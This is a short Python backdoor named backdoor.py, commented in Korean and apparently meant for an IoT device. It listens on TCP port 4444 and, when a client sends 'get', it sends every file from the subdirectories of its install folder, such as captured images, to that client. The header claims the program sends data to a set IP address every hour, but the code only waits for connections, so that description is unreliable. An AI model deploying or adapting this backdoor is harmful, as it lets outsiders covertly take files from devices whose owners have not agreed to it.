# backdoor.py
# IoT 기기에서 작동하면서 1시간에 한 번씩 지정된 포트의 IP주소로
# backdoor.py 파일이 존재하는 디렉토리의 정보를 전달하는 프로그램

from socket import *    # 서로 다른 호스트에 존재하는 기기끼리 통신하기 위해 Socket API import
import os               # 파일 경로 사용을 위해 os import
import time             # 시간 정보를 사용하기 위해 time import
import json             # TCP 통신에서 데이터를 담을 컨테이너로 json 사용
import os.path

# 서버 소켓 오픈
server_port = 4444
server_socket = socket(AF_INET, SOCK_STREAM)    # TCP 프로토콜을 사용하는 서버 소켓 생성
server_socket.bind(("", server_port))           # 프로그램이 존재하는 IP주소의 포트에 소켓 연결
server_socket.listen(1)                         # 클라이언트의 연결을 기다리는 상태
dir_list = []                                   # backdoor.py 파일이 존재하는 디렉토리들의 이름을 저장할 dir_list 리스트 생성
path = os.getcwd()                              # backdoor.py 프로그램이 설치된 경로를 확인

def send_img(dirpath):  # 이미지를 전송
    global path                 # backdoor.py 파일이 존재하는 경로를 전역 변수로 사용
    files = os.listdir(dirpath) # 인자로 전달받은 dirpath에 존재하는 파일들의 목록을 files 리스트에 저장
    for i in range(len(files)): # files 리스트의 길이만큼 for문 실행
        capture_file_name = path+"/"+dirpath +"/"+files[i]  # 전송할 파일의 full path를 생성
        file = open(capture_file_name, "rb")                # 전송할 파일을 open
        img_size = os.path.getsize(capture_file_name)       # 전송할 파일의 크기 지정
        img = file.read(img_size)                           # 전송할 파일을 파일의 크기만큼 read
        file.close()                                        # 파일 스트림을 close
        client_socket.sendall(img)                          # 연결된 소켓에게 이미지 전달

print("TCPServer Waiting for client on port "+str(server_port)) # 정보를 전달하는 서버 프로그램이 지정된 포트에서 작동하고 있다는 안내 문구 출력

while True:
    # 클라이언트 요청 대기중 .
    client_socket, address = server_socket.accept()         # 서버 소켓이 accept한 클라이언트 소켓의 정보 가져옴
    server_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)   # 서버 프로그램이 종료된 뒤에도 바로 프로그램을 재시작할 수 있도록 타이머 설정
    # 연결 요청 성공
    print("I got a connection from ", address)              # 클라이언트와의 연결 안내 문구

    if client_socket.recv(1024).decode() == 'get':          # 클라이언트쪽에서 'get' 메세지를 주면 파일을 클라이언트 프로그램에게 전송
        print('hi') # 클라이언트와의 연결 확인을 위해 서버쪽의 터미널에 'hi' 문구 출력

        # send_img 함수에 인자값으로 파일 이름을 넣어주면 차례대로 for문을 돌면서 클라이언트쪽으로 이미지파일 전송
        dir_list = os.listdir(path)                 # 경로에 존재하는 디렉토리들
        dir_list.remove('backdoor.py')              # 저장된 목록 중 해당 프로그램인 backdoor.py는 디렉토리가 아니므로 삭제

        dir_count = int(len(dir_list))              # 저장된 디렉토리들의 개수를 저장
        data = json.dumps({"size":dir_count})       # json 자료형을 통해 디렉토리의 개수를 저장
        client_socket.send(data.encode())           # 클라이언트에게 디렉토리 개수 전송
        for i in dir_list:                          # for문을 통해 각각의 디렉토리마다 이미지를 전송
            send_img(i)
            print(str(i) + " directory finish")     # 해당 디렉토리가 끝났다는 안내문구 출력
            client_socket.send('finish'.encode())   # 클라이언트 쪽에서 이미지 파일을 받을 때 지금 보내는 파일을 마무리를 하라고 알려주는 안내문구 전송
            time.sleep(5)                           # 먼저 보낸 이미지 파일을 다 받기를 기다리기 위해서 5초 동안 time
        print('Sending file successfully')          # 파일을 성공적으로 전송했다는 안내문구
    else:
        client_socket.close()                       # 'get'이 아닌 다른 문구를 입력받으면 종료
        print('Socket closed')